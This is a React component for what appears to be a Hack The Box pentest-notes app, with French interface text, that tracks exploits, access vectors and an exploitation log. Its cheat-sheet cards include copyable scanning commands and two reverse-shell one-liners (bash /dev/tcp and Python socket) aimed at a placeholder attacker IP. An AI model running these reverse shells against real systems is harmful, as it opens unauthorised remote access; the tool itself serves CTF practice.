import React from 'react';
import { Button } from '../../ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '../../ui/card';
import { Input } from '../../ui/input';
import { Textarea } from '../../ui/textarea';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../../ui/select';
import { Trash2, Copy, FileText } from 'lucide-react';
import { useHTBStore, type HTBProject } from '../../../stores/htbStore';

interface InitialAccessProps {
  selected: HTBProject;
  setEditingStep: (step: any) => void;
  setExploitModalOpen: (open: boolean) => void;
}

export const InitialAccess: React.FC<InitialAccessProps> = ({
  selected,
  setEditingStep,
  setExploitModalOpen
}) => {
  const { updateProject } = useHTBStore();

  return (
    <div className="space-y-6">
      {/* Service Exploits Section */}
      <Card className="border-orange-600 bg-slate-800">
        <CardHeader>
          <CardTitle className="text-orange-300">🎯 Exploits de Services</CardTitle>
          <p className="text-slate-400 text-sm">Services transférés depuis la reconnaissance pour exploitation</p>
        </CardHeader>
        <CardContent className="space-y-4">
          {selected.serviceExploits && selected.serviceExploits.length > 0 ? (
            selected.serviceExploits.map((exploit) => (
              <Card key={exploit.id} className="border-slate-600 bg-slate-700">
                <CardHeader className="pb-3">
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-sm flex items-center gap-2">
                      <span className="text-cyan-400">{exploit.servicePort}/{exploit.serviceProto}</span>
                      <span className="text-white">{exploit.serviceName}</span>
                      {exploit.serviceVersion && <span className="text-slate-400">({exploit.serviceVersion})</span>}
                      <div className={`px-2 py-1 rounded text-xs ${
                        exploit.status === 'working' ? 'bg-green-700 text-green-100' :
                        exploit.status === 'failed' ? 'bg-red-700 text-red-100' :
                        'bg-yellow-700 text-yellow-100'
                      }`}>
                        {exploit.status === 'working' ? '✅ Fonctionnel' :
                         exploit.status === 'failed' ? '❌ Échec' :
                         '🧪 Test'}
                      </div>
                    </CardTitle>
                    <Button 
                      size="sm" 
                      variant="outline" 
                      className="bg-red-700 border-red-600 text-red-100 hover:bg-red-600"
                      onClick={() => {
                        const updatedExploits = selected.serviceExploits?.filter(e => e.id !== exploit.id) || [];
                        updateProject(selected.id, { serviceExploits: updatedExploits });
                      }}
                    >
                      Supprimer
                    </Button>
                  </div>
                </CardHeader>
                <CardContent className="space-y-3">
                  <div>
                    <label className="text-xs text-slate-300 block mb-1">Type d'exploit</label>
                    <Input 
                      value={exploit.exploitType}
                      onChange={(e) => {
                        const updatedExploits = selected.serviceExploits?.map(ex => 
                          ex.id === exploit.id ? { ...ex, exploitType: e.target.value } : ex
                        ) || [];
                        updateProject(selected.id, { serviceExploits: updatedExploits });
                      }}
                      placeholder="ex: SQLi, RCE, Buffer overflow, CVE-2021-XXXX..."
                      className="bg-slate-600 border-slate-500 text-slate-100"
                    />
                  </div>
                  <div>
                    <label className="text-xs text-slate-300 block mb-1">Détails</label>
                    <Textarea 
                      rows={3}
                      value={exploit.details}
                      onChange={(e) => {
                        const updatedExploits = selected.serviceExploits?.map(ex => 
                          ex.id === exploit.id ? { ...ex, details: e.target.value } : ex
                        ) || [];
                        updateProject(selected.id, { serviceExploits: updatedExploits });
                      }}
                      placeholder="Détails du payload, URL vulnérable, code d'exploit..."
                      className="bg-slate-600 border-slate-500 text-slate-100 min-h-[80px]"
                    />
                  </div>
                  <div>
                    <label className="text-xs text-slate-300 block mb-1">Commandes</label>
                    <Textarea 
                      rows={3}
                      value={exploit.commands}
                      onChange={(e) => {
                        const updatedExploits = selected.serviceExploits?.map(ex => 
                          ex.id === exploit.id ? { ...ex, commands: e.target.value } : ex
                        ) || [];
                        updateProject(selected.id, { serviceExploits: updatedExploits });
                      }}
                      placeholder="Commandes utilisées pour l'exploitation..."
                      className="bg-slate-600 border-slate-500 text-slate-100 min-h-[80px]"
                    />
                  </div>
                  <div className="flex gap-2">
                    <Button 
                      size="sm" 
                      variant="outline"
                      className="bg-yellow-700 border-yellow-600 text-yellow-100 hover:bg-yellow-600"
                      onClick={() => {
                        const updatedExploits = selected.serviceExploits?.map(ex => 
                          ex.id === exploit.id ? { ...ex, status: 'testing' as const } : ex
                        ) || [];
                        updateProject(selected.id, { serviceExploits: updatedExploits });
                      }}
                    >
                      🧪 Test
                    </Button>
                    <Button 
                      size="sm" 
                      variant="outline"
                      className="bg-green-700 border-green-600 text-green-100 hover:bg-green-600"
                      onClick={() => {
                        const updatedExploits = selected.serviceExploits?.map(ex => 
                          ex.id === exploit.id ? { ...ex, status: 'working' as const } : ex
                        ) || [];
                        updateProject(selected.id, { serviceExploits: updatedExploits });
                      }}
                    >
                      ✅ Fonctionne
                    </Button>
                    <Button 
                      size="sm" 
                      variant="outline"
                      className="bg-red-700 border-red-600 text-red-100 hover:bg-red-600"
                      onClick={() => {
                        const updatedExploits = selected.serviceExploits?.map(ex => 
                          ex.id === exploit.id ? { ...ex, status: 'failed' as const } : ex
                        ) || [];
                        updateProject(selected.id, { serviceExploits: updatedExploits });
                      }}
                    >
                      ❌ Échec
                    </Button>
                  </div>
                </CardContent>
              </Card>
            ))
          ) : (
            <div className="text-slate-400 text-center py-8">
              Aucun exploit configuré. Ajoutez des services depuis l'onglet Reconnaissance pour commencer.
            </div>
          )}
        </CardContent>
      </Card>

      {/* Initial Access Generic Commands */}
      <Card className="border-blue-600 bg-slate-800">
        <CardHeader>
          <CardTitle className="text-blue-300">📖 Commandes Génériques - Initial Access</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
            
            {/* Web Vulnerabilities */}
            <Card className="border-slate-700 bg-slate-700">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm text-slate-100">🌐 Web Vulnerabilities</CardTitle>
              </CardHeader>
              <CardContent className="space-y-2">
                <div className="space-y-2 text-xs">
                  <div className="relative group">
                    <code className="block bg-slate-900 border border-slate-600 rounded px-2 py-1 text-green-400 cursor-pointer" onClick={() => navigator.clipboard.writeText(`gobuster dir -u http://${selected.ip || 'TARGET'}/ -w /usr/share/wordlists/dirb/common.txt`)}>
                      gobuster dir -u http://{selected.ip || 'TARGET'}/ -w /usr/share/wordlists/dirb/common.txt
                    </code>
                    <Button 
                      variant="ghost"
                      size="sm"
                      className="absolute right-1 top-1 h-5 w-5 p-0 opacity-0 group-hover:opacity-100 transition-opacity"
                      onClick={() => navigator.clipboard.writeText(`gobuster dir -u http://${selected.ip || 'TARGET'}/ -w /usr/share/wordlists/dirb/common.txt`)}
                      title="Copier la commande"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <div className="relative group">
                    <code className="block bg-slate-900 border border-slate-600 rounded px-2 py-1 text-green-400 cursor-pointer" onClick={() => navigator.clipboard.writeText(`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://${selected.ip || 'TARGET'}/FUZZ`)}>
                      ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://{selected.ip || 'TARGET'}/FUZZ
                    </code>
                    <Button 
                      variant="ghost"
                      size="sm"
                      className="absolute right-1 top-1 h-5 w-5 p-0 opacity-0 group-hover:opacity-100 transition-opacity"
                      onClick={() => navigator.clipboard.writeText(`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://${selected.ip || 'TARGET'}/FUZZ`)}
                      title="Copier la commande"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <div className="relative group">
                    <code className="block bg-slate-900 border border-slate-600 rounded px-2 py-1 text-green-400 cursor-pointer" onClick={() => navigator.clipboard.writeText(`nikto -h http://${selected.ip || 'TARGET'}`)}>
                      nikto -h http://{selected.ip || 'TARGET'}
                    </code>
                    <Button 
                      variant="ghost"
                      size="sm"
                      className="absolute right-1 top-1 h-5 w-5 p-0 opacity-0 group-hover:opacity-100 transition-opacity"
                      onClick={() => navigator.clipboard.writeText(`nikto -h http://${selected.ip || 'TARGET'}`)}
                      title="Copier la commande"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Service Exploits */}
            <Card className="border-slate-700 bg-slate-700">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm text-slate-100">🔧 Service Exploits</CardTitle>
              </CardHeader>
              <CardContent className="space-y-2">
                <div className="space-y-2 text-xs">
                  <div className="relative group">
                    <code className="block bg-slate-900 border border-slate-600 rounded px-2 py-1 text-green-400 cursor-pointer" onClick={() => navigator.clipboard.writeText(`searchsploit [service_name]`)}>
                      searchsploit [service_name]
                    </code>
                    <Button 
                      variant="ghost"
                      size="sm"
                      className="absolute right-1 top-1 h-5 w-5 p-0 opacity-0 group-hover:opacity-100 transition-opacity"
                      onClick={() => navigator.clipboard.writeText(`searchsploit [service_name]`)}
                      title="Copier la commande"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <div className="relative group">
                    <code className="block bg-slate-900 border border-slate-600 rounded px-2 py-1 text-green-400 cursor-pointer" onClick={() => navigator.clipboard.writeText(`msfconsole`)}>
                      msfconsole
                    </code>
                    <Button 
                      variant="ghost"
                      size="sm"
                      className="absolute right-1 top-1 h-5 w-5 p-0 opacity-0 group-hover:opacity-100 transition-opacity"
                      onClick={() => navigator.clipboard.writeText(`msfconsole`)}
                      title="Copier la commande"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <div className="relative group">
                    <code className="block bg-slate-900 border border-slate-600 rounded px-2 py-1 text-green-400 cursor-pointer" onClick={() => navigator.clipboard.writeText(`enum4linux -a ${selected.ip || 'TARGET'}`)}>
                      enum4linux -a {selected.ip || 'TARGET'}
                    </code>
                    <Button 
                      variant="ghost"
                      size="sm"
                      className="absolute right-1 top-1 h-5 w-5 p-0 opacity-0 group-hover:opacity-100 transition-opacity"
                      onClick={() => navigator.clipboard.writeText(`enum4linux -a ${selected.ip || 'TARGET'}`)}
                      title="Copier la commande"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Reverse Shells */}
            <Card className="border-slate-700 bg-slate-700">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm text-slate-100">🐚 Reverse Shells</CardTitle>
              </CardHeader>
              <CardContent className="space-y-2">
                <div className="space-y-2 text-xs">
                  <div className="relative group">
                    <code className="block bg-slate-900 border border-slate-600 rounded px-2 py-1 text-green-400 cursor-pointer" onClick={() => navigator.clipboard.writeText(`nc -lvnp 4444`)}>
                      nc -lvnp 4444
                    </code>
                    <Button 
                      variant="ghost"
                      size="sm"
                      className="absolute right-1 top-1 h-5 w-5 p-0 opacity-0 group-hover:opacity-100 transition-opacity"
                      onClick={() => navigator.clipboard.writeText(`nc -lvnp 4444`)}
                      title="Copier la commande"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <div className="relative group">
                    <code className="block bg-slate-900 border border-slate-600 rounded px-2 py-1 text-green-400 cursor-pointer" onClick={() => navigator.clipboard.writeText(`bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1`)}>
                      bash -i &gt;&amp; /dev/tcp/[YOUR_IP]/4444 0&gt;&amp;1
                    </code>
                    <Button 
                      variant="ghost"
                      size="sm"
                      className="absolute right-1 top-1 h-5 w-5 p-0 opacity-0 group-hover:opacity-100 transition-opacity"
                      onClick={() => navigator.clipboard.writeText(`bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1`)}
                      title="Copier la commande"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <div className="relative group">
                    <code className="block bg-slate-900 border border-slate-600 rounded px-2 py-1 text-green-400 cursor-pointer" onClick={() => navigator.clipboard.writeText(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[YOUR_IP]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`)}>
                      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[YOUR_IP]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
                    </code>
                    <Button 
                      variant="ghost"
                      size="sm"
                      className="absolute right-1 top-1 h-5 w-5 p-0 opacity-0 group-hover:opacity-100 transition-opacity"
                      onClick={() => navigator.clipboard.writeText(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[YOUR_IP]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`)}
                      title="Copier la commande"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>

          <div className="grid lg:grid-cols-2 gap-4 mt-6">
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <CardTitle className="text-slate-100">Vecteurs d'accès potentiels</CardTitle>
              </CardHeader>
              <CardContent className="space-y-2">
                <div className="grid md:grid-cols-4 gap-2">
                  <Input placeholder="Label" className="bg-slate-700 border-slate-600 text-slate-100" id="vecLabel" />
                  <Select defaultValue="yellow" onValueChange={(v:any)=>{ (document.getElementById('vecLevel') as any).value = v; }}>
                    <SelectTrigger className="bg-slate-700 border-slate-600 text-slate-100"><SelectValue /></SelectTrigger>
                    <SelectContent className="bg-slate-800 border-slate-600">
                      <SelectItem value="green">🟢 Faible</SelectItem>
                      <SelectItem value="yellow">🟡 Moyen</SelectItem>
                      <SelectItem value="red">🔴 Élevé</SelectItem>
                    </SelectContent>
                  </Select>
                  <input type="hidden" id="vecLevel" value="yellow" />
                  <Textarea rows={1} placeholder="Note rapide" className="bg-slate-700 border-slate-600 text-slate-100" id="vecNote" />
                  <Button className="bg-blue-600 hover:bg-blue-700" onClick={()=>{
                    const label = (document.getElementById('vecLabel') as HTMLInputElement).value;
                    const level = (document.getElementById('vecLevel') as HTMLInputElement).value;
                    const note = (document.getElementById('vecNote') as HTMLInputElement).value;
                    if(label.trim()) {
                      const newVector = { label: label.trim(), level: level as 'red' | 'yellow' | 'green', note: note.trim() };
                      updateProject(selected.id,{ potentialVectors: [...selected.potentialVectors, newVector] });
                    }
                    (document.getElementById('vecLabel') as HTMLInputElement).value='';
                    (document.getElementById('vecNote') as HTMLInputElement).value='';
                  }}>Ajouter</Button>
                </div>
                <div className="space-y-2">
                  {selected.potentialVectors && selected.potentialVectors.length > 0 ? (
                    selected.potentialVectors.map((vec, i) => (
                      <div key={i} className="flex items-center justify-between p-2 bg-slate-700 rounded border border-slate-600">
                        <div className="flex items-center gap-2 flex-1">
                          <span className={`w-3 h-3 rounded-full ${vec.level === 'green' ? 'bg-green-500' : vec.level === 'yellow' ? 'bg-yellow-500' : 'bg-red-500'}`}></span>
                          <span className="text-slate-100 font-medium">{vec.label}</span>
                          {vec.note && <span className="text-slate-400 text-sm">— {vec.note}</span>}
                        </div>
                        <Button size="sm" variant="outline" className="bg-red-700 border-red-600 text-red-200 hover:bg-red-600" onClick={()=>{
                          const copy = [...selected.potentialVectors]; copy.splice(i,1); updateProject(selected.id,{ potentialVectors: copy });
                        }}><Trash2 className="w-3 h-3" /></Button>
                      </div>
                    ))
                  ) : (
                    <div className="text-slate-400 text-center py-4">Aucun vecteur d'accès identifié</div>
                  )}
                </div>
              </CardContent>
            </Card>
          </div>
        </CardContent>
      </Card>

      {/* Journal des exploits */}
      <Card className="border-slate-700 bg-slate-800">
        <CardHeader>
          <CardTitle className="text-slate-100 flex items-center gap-2"><FileText className="w-4 h-4" /> Journal d'exploitation</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="flex justify-end mb-2">
            <Button variant="outline" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={()=> { setEditingStep(null); setExploitModalOpen(true); }}>+ Nouvelle étape</Button>
          </div>
          {selected.exploitLog.length === 0 ? (
            <div className="text-slate-400 text-center py-8">
              Aucune étape d'exploitation documentée. Ajoutez vos premières tentatives pour commencer.
            </div>
          ) : (
            <div className="space-y-3">
              {selected.exploitLog.map((step) => (
                <Card key={step.id} className="border-slate-600 bg-slate-700">
                  <CardContent className="p-4">
                    <div className="flex items-start justify-between">
                      <div className="flex-1">
                        <div className="flex items-center gap-2 mb-2">
                          <span className="text-slate-100 font-medium">{step.title}</span>
                          <span className="text-xs text-slate-400">{new Date(step.timestamp).toLocaleString('fr-FR')}</span>
                        </div>
                        {step.command && (
                          <div className="mb-2">
                            <div className="text-xs text-slate-400 mb-1">Commande:</div>
                            <code className="block bg-slate-900 border border-slate-600 rounded px-2 py-1 text-green-400 text-sm">{step.command}</code>
                          </div>
                        )}
                        {step.result && (
                          <div>
                            <div className="text-xs text-slate-400 mb-1">Résultat:</div>
                            <pre className="text-xs bg-slate-900 border border-slate-600 rounded px-2 py-1 text-slate-300 whitespace-pre-wrap max-h-40 overflow-y-auto">{step.result}</pre>
                          </div>
                        )}
                      </div>
                      <div className="flex gap-2">
                        <Button size="sm" variant="outline" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setEditingStep(step)}>Éditer</Button>
                        <Button size="sm" variant="outline" className="bg-red-700 border-red-600 text-red-200 hover:bg-red-600" onClick={() => {
                          const copy = selected.exploitLog.filter(s => s.id !== step.id);
                          updateProject(selected.id, { exploitLog: copy });
                        }}><Trash2 className="w-3 h-3" /></Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
};
